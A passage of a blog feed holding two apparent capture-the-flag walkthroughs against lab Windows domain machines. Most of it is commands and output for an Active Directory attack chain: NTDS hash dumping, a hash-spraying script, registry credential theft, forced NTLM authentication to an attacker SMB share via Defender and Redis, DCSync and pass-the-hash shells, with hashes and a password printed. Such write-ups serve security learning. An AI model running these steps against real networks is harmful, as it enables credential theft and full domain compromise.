1638KC/s 123456..cocoliso<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL &gt; backup.ad.dump<br></code></pre></td></tr></table></figure><p>I get lots and lots of hashes,None of them work.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> backup.ad.dump |grep <span class="hljs-string">&quot;Administrator:&quot;</span><br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::<br>Administrator:aes256-cts-hmac-sha1-96:d35ae5b9bf5ee7f6c4480bb73b3d8235f022b4fd504c7a3e35b9101b4c40e1d4<br>Administrator:aes128-cts-hmac-sha1-96:26c50872286f2847fc85cf611871106d<br>Administrator:des-cbc-md5:c767fd15d55eabef<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$  crackmapexec smb apt -H 2b576acbe6bcfda7294d6bd18041b8fe -u administrator<br>SMB         apt             445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)<br>SMB         apt             445    APT              [-] htb.local\administrator:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure><p>I try to screen:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> backup.ad.dump |grep <span class="hljs-string">&quot;:&quot;</span> &gt; user.txt<br>$ <span class="hljs-built_in">cat</span> user.txt| awk -F <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123; print $1&#125;&#x27;</span> &gt; users.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ kerbrute userenum -d htb.local users.txt --dc apt.htb.local -o exituser.txt<br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: v1.0.3 (9dad6e1) - 05/27/22 - Ronnie Flathers @ropnop<br><br>2022/05/27 02:38:51 &gt;  Using KDC(s):<br>2022/05/27 02:38:51 &gt;  apt.htb.local:88<br><br>2022/05/27 02:38:57 &gt;  [+] VALID USERNAME: APT<span class="hljs-variable">$@htb</span>.<span class="hljs-built_in">local</span><br>2022/05/27 02:38:57 &gt;  [+] VALID USERNAME: Administrator@htb.local<br>2022/05/27 02:43:14 &gt;  [+] VALID USERNAME: henry.vinson@htb.local<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> backup.ad.dump|grep <span class="hljs-string">&quot;henry.vinson&quot;</span>            <br>henry.vinson:3647:aad3b435b51404eeaad3b435b51404ee:2de80758521541d19cabba480b260e8f:::<br>henry.vinson:aes256-cts-hmac-sha1-96:4c0ec4cffc953266ed72d9b565da62115655d2f402416af92e4e76d121663e2f<br>henry.vinson:aes128-cts-hmac-sha1-96:da63c28166768a2829f00d30ec9fbddd<br>henry.vinson:des-cbc-md5:80a2c83213b3dfd6<br></code></pre></td></tr></table></figure><p>But its hash is also unusable. Maybe its hash is hidden in another user’s hash, so I need to spray, but the target machine will be blocked if it fails too many times. I can’t enumerate through SMB. LDAP does not support batches. A lot of hashes are the same:</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">janna.espinoza:5176:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:1378<span class="hljs-title">db64d3dee4d691ca0d5ee45644f1</span>:::</span><br><span class="hljs-function"><span class="hljs-title">rylan.harding</span>:5177:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:4<span class="hljs-title">fe2f6b9bc5efce8bbbba036e98bf073</span>:::</span><br><span class="hljs-function"><span class="hljs-title">lindsey.giles</span>:5178:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:9362<span class="hljs-title">ef2b2886d11482238a9de5abf2db</span>:::</span><br><span class="hljs-function"><span class="hljs-title">amata.walter</span>:5179:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="hljs-title">b9452fd4dcc5b4ad01ff8f16182e880</span>:::</span><br><span class="hljs-function"><span class="hljs-title">magdalene.abbott</span>:5180:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:e75f4cb02074ed5e9b5aa87f714a0de2</span>:::</span><br><span class="hljs-function"><span class="hljs-title">griffin.long</span>:5181:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:23312<span class="hljs-title">c6dca04f8fa262e79f6072cf73e</span>:::</span><br><span class="hljs-function"><span class="hljs-title">marisa.hawkins</span>:5182:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:1<span class="hljs-title">d6c674ad3be743e042d67a381926cec</span>:::</span><br><span class="hljs-function"><span class="hljs-title">igor.cervantes</span>:5183:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:47<span class="hljs-title">fca05c4ff0bb06c1990aa42099cd68</span>:::</span><br><span class="hljs-function"><span class="hljs-title">yu</span>-<span class="hljs-title">kai.decker</span>:5184:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:c824b104bb78c4b118c9328b44214b49</span>:::</span><br><span class="hljs-function"><span class="hljs-title">marjoke.young</span>:5185:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:10169932<span class="hljs-title">dda21772ceccc3de4e97ab51</span>:::</span><br><span class="hljs-function"><span class="hljs-title">kinna.puckett</span>:5186:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:a0506423413fe76ef4cbc3a7b7af1dbb</span>:::</span><br><span class="hljs-function"><span class="hljs-title">jacquetta.rodriguez</span>:5187:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:858<span class="hljs-title">a8bc0c1e6ab522a8102d8598c8e5b</span>:::</span><br><span class="hljs-function"><span class="hljs-title">martica.hall</span>:5188:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:653<span class="hljs-title">df3e3aad0dc51978f9d9fb3719207</span>:::</span><br><span class="hljs-function"><span class="hljs-title">emma.hansen</span>:5189:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:98609<span class="hljs-title">fabfc2427a65169fbc9ef915a1f</span>:::</span><br><span class="hljs-function"><span class="hljs-title">tiff.martin</span>:5190:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:b6f70c398b118d00e46a23cafe70577a</span>:::</span><br><span class="hljs-function"><span class="hljs-title">seiji.holland</span>:5191:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:cf7b9ddf70f2c061ee41f462ffc9838b</span>:::</span><br><span class="hljs-function"><span class="hljs-title">parker.goodwin</span>:5192:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:f0cdda3a325b7e7b1b84a332bc207d4a</span>:::</span><br><span class="hljs-function"><span class="hljs-title">cuong.pierce</span>:5193:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:413344<span class="hljs-title">e073b892b64af93b8c40bf4aa5</span>:::</span><br><span class="hljs-function"><span class="hljs-title">prue.olson</span>:5194:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:7<span class="hljs-title">c662956a4a0486a80fbb2403c5a9c2c</span>:::</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> backup.ad.dump |grep <span class="hljs-string">&quot;:::&quot;</span> &gt; hashes.txt<br>$ <span class="hljs-built_in">cat</span> hashes.txt | awk -F <span class="hljs-string">&quot;:&quot;</span> <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span> &gt; newhash.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash </span><br><span class="hljs-comment">#Request the TGT with hash</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> exituser.txt) <br><span class="hljs-keyword">do</span> <br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> newhash.txt) <br>        <span class="hljs-keyword">do</span> <br>                <span class="hljs-built_in">echo</span> trying <span class="hljs-variable">$i</span>:<span class="hljs-variable">$j</span> <br>                <span class="hljs-built_in">echo</span> <br>                getTGT.py htb.local/<span class="hljs-variable">$i</span> -hashes <span class="hljs-variable">$j</span>:<span class="hljs-variable">$j</span>    <br>                <span class="hljs-built_in">echo</span> <br>                <span class="hljs-built_in">sleep</span> 5 <br>        <span class="hljs-keyword">done</span> <br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="User-txt"><a href="#User-txt" class="headerlink" title="User.txt"></a>User.txt</h2><p>A bash script is used to enumerate them in batches, resulting in a usable hash. henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ reg.py htb.local/henry.vinson@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKU -s | <span class="hljs-built_in">tee</span> hku.reg <br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[!] Cannot check RemoteRegistry status. Hoping it is started...<br>.............<br>&lt;SNIP&gt;<br><br>\Software\GiganticHostingManagementSystem\ <br>        UserName        REG_SZ   henry.vinson_adm <br>        PassWord        REG_SZ   G1<span class="hljs-comment">#Ny5@2dvht </span><br>\Software\Microsoft\<br><br>&lt;/SNIP&gt;<br>.............<br></code></pre></td></tr></table></figure><p>This certificate can be used to log into winrm：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i htb.local -u henry.vinson_adm -p <span class="hljs-string">&#x27;G1#Ny5@2dvht&#x27;</span><br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt; <span class="hljs-built_in">cd</span> ../desktop<br>*Evil-WinRM* PS C:\Users\henry.vinson_adm\desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\henry.vinson_adm\desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---        5/27/2022   5:55 AM             34 user.txt<br><br></code></pre></td></tr></table></figure><h2 id="Root-txt"><a href="#Root-txt" class="headerlink" title="Root.txt"></a>Root.txt</h2><p>There will be a powershell history in the user directory：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----       11/10/2020  10:58 AM            458 ConsoleHost_history.txt<br><br><br>*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline&gt; <span class="hljs-built_in">cat</span> ConsoleHost_history.txt<br><span class="hljs-variable">$Cred</span> = get-credential administrator<br>invoke-command -credential <span class="hljs-variable">$Cred</span> -computername localhost -scriptblock &#123;Set-ItemProperty -Path <span class="hljs-string">&quot;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&quot;</span> lmcompatibilitylevel -Type DWORD -Value 2 -Force&#125;<br>*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline&gt;<br></code></pre></td></tr></table></figure><p>The administrator has set the authentication level to level 2, which obviously means that only NTLM authentication and not NTLMv2 will be performed.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline&gt; cmd /C C:\Users\<span class="hljs-string">&quot;All Users&quot;</span>\Microsoft\<span class="hljs-string">&quot;Windows Defender&quot;</span>\platform\<span class="hljs-number">4.18</span>.<span class="hljs-number">2010.7</span><span class="hljs-literal">-0</span>\X86\MpCmdRun.exe <span class="hljs-literal">-Scan</span>  <span class="hljs-literal">-ScanType</span> <span class="hljs-number">3</span> <span class="hljs-operator">-File</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">16.5</span>\hello\win.exe<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">SMB</span>] NTLMv1 Client   : ::ffff:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.213</span><br>[<span class="hljs-type">SMB</span>] NTLMv1 Username : HTB\APT<span class="hljs-variable">$</span><br>[<span class="hljs-type">SMB</span>] NTLMv1 Hash     : APT<span class="hljs-variable">$</span>::HTB:F84EFE769593EF111C527869238BD19C89D9A27C961061EE:F84EFE769593EF111C527869238BD19C89D9A27C961061EE:<span class="hljs-number">001</span>ad42270895f98<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">https://crack.sh/netntlm/<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">APT<span class="hljs-variable">$</span>:d167c3238864b12f5f82feae86a7f798<br></code></pre></td></tr></table></figure><p>I can start it easily DCsync：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ secretsdump.py htb.local/APT\<span class="hljs-variable">$@htb</span>.<span class="hljs-built_in">local</span> -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied <br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::<br>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::<br>henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::<br>APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i htb.local -u administrator -H c370bddf384a691d811ff3495e8a72e2<br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="hljs-built_in">cat</span> ../desktop/root.txt<br>24..........................................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TryHackMe Walkthrough - VulnNet Active</title>
    <link href="/post/TryHackMe-VulnNet%20Active.html"/>
    <url>/post/TryHackMe-VulnNet%20Active.html</url>
    
    <content type="html"><![CDATA[<h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Sat Jun 25 20:27:04 2022 as: nmap -sC -sV -Pn -p- -O -T4 -oA nmap.txt 10.10.43.168</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.43.168<br>Host is up (0.31s latency).<br>Not shown: 65522 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>6379/tcp  open  redis         Redis key-value store 2.8.2402<br>9389/tcp  open  mc-nmf        .NET Message Framing<br>49666/tcp open  msrpc         Microsoft Windows RPC<br>49668/tcp open  msrpc         Microsoft Windows RPC<br>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49674/tcp open  msrpc         Microsoft Windows RPC<br>49679/tcp open  msrpc         Microsoft Windows RPC<br>49695/tcp open  msrpc         Microsoft Windows RPC<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br>No OS matches <span class="hljs-keyword">for</span> host<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-06-25T12:36:24<br>|_  start_date: N/A<br><br>OS and Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Sat Jun 25 20:37:00 2022 -- 1 IP address (1 host up) scanned in 595.83 seconds</span><br></code></pre></td></tr></table></figure><p>看起来88端口被防火墙掩盖掉了，5985 winrm也被过滤掉了。SMB共享有开着，6379有个redis服务，初始访问路径已经很清楚了，要么走smb命名管道命令执行，那就需要SMB允许匿名访问或者RPC允许匿名访问找到泄露的身份凭证。要么就是6379 redis漏洞利用。而445在拒绝了我的匿名访问，那么只有redis未授权了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$redis</span>-cli -h 10.10.43.168<br>10.10.43.168:6379&gt; <span class="hljs-built_in">help</span> <br>redis-cli 6.0.16<br>To get <span class="hljs-built_in">help</span> about Redis commands <span class="hljs-built_in">type</span>:<br>      <span class="hljs-string">&quot;help @&lt;group&gt;&quot;</span> to get a list of commands <span class="hljs-keyword">in</span> &lt;group&gt;<br>      <span class="hljs-string">&quot;help &lt;command&gt;&quot;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span> on &lt;<span class="hljs-built_in">command</span>&gt;<br>      <span class="hljs-string">&quot;help &lt;tab&gt;&quot;</span> to get a list of possible <span class="hljs-built_in">help</span> topics<br>      <span class="hljs-string">&quot;quit&quot;</span> to <span class="hljs-built_in">exit</span><br><br>To <span class="hljs-built_in">set</span> redis-cli preferences:<br>      <span class="hljs-string">&quot;:set hints&quot;</span> <span class="hljs-built_in">enable</span> online hints<br>      <span class="hljs-string">&quot;:set nohints&quot;</span> <span class="hljs-built_in">disable</span> online hints<br>Set your preferences <span class="hljs-keyword">in</span> ~/.redisclirc<br>10.10.43.168:6379&gt; get @group<br>(nil)<br>10.10.43.168:6379&gt; get <span class="hljs-built_in">users</span><br>(nil)<br>10.10.43.168:6379&gt; config get *<br>........................<br>104) <span class="hljs-string">&quot;C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402&quot;</span><br>105) <span class="hljs-string">&quot;maxmemory-policy&quot;</span><br>106) <span class="hljs-string">&quot;volatile-lru&quot;</span><br>107) <span class="hljs-string">&quot;appendfsync&quot;</span><br>108) <span class="hljs-string">&quot;everysec&quot;</span><br>109) <span class="hljs-string">&quot;save&quot;</span><br>110) <span class="hljs-string">&quot;jd 3600 jd 300 jd 60&quot;</span><br>111) <span class="hljs-string">&quot;loglevel&quot;</span><br>112) <span class="hljs-string">&quot;notice&quot;</span><br>113) <span class="hljs-string">&quot;client-output-buffer-limit&quot;</span><br>114) <span class="hljs-string">&quot;normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60&quot;</span><br>115) <span class="hljs-string">&quot;unixsocketperm&quot;</span><br>116) <span class="hljs-string">&quot;0&quot;</span><br>117) <span class="hljs-string">&quot;slaveof&quot;</span><br>118) <span class="hljs-string">&quot;&quot;</span><br>119) <span class="hljs-string">&quot;notify-keyspace-events&quot;</span><br>120) <span class="hljs-string">&quot;&quot;</span><br>121) <span class="hljs-string">&quot;bind&quot;</span><br>122) <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>一个用户名，但不像那么回事：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">enterprise-security<br></code></pre></td></tr></table></figure><p>后来我发现了这个，并尝试枚举了下RPC：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/cube0x0/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">1675</span><br></code></pre></td></tr></table></figure><p>根据漏洞提示进行RPC枚举确实符合EXP的利用条件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$rpcdump</span>.py @10.10.43.168 | egrep <span class="hljs-string">&#x27;MS-RPRN|MS-PAR&#x27;</span><br>Protocol: [MS-RPRN]: Print System Remote Protocol <br>Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol <br></code></pre></td></tr></table></figure><p>看了漏洞分析才想起，我之前做过一次。本质是低用户被意外得允许更改标志位导致系统错认为该低用户有安装驱动服务得权限。但是他需要一个合法用户，而我没有。单单一个用户名其实为我带不来什么：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$smbmap</span> -H 10.10.43.168 -u enterprise-security<br>[!] Authentication error on 10.10.43.168<br></code></pre></td></tr></table></figure><p>那么当前其实我也只用也只能围绕redis展开搜索。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220625220711092.png" alt="image-20220625220711092"></p><p>看到这我有了一个想法，它既然可以枚举目录，那么应该可以枚举smb共享目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.43.168:6379&gt; EVAL <span class="hljs-string">&quot;dofile(&#x27;//10.11.75.230/share&#x27;)&quot;</span> 0<br>(error) ERR Error running script (call to f_7f0425edd207f314e9d1689b9c224af6f663f96d): @user_script:1: cannot open //10.13.43.238/share: Permission denied <br>(5.14s)<br>10.10.43.168:6379&gt; <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td 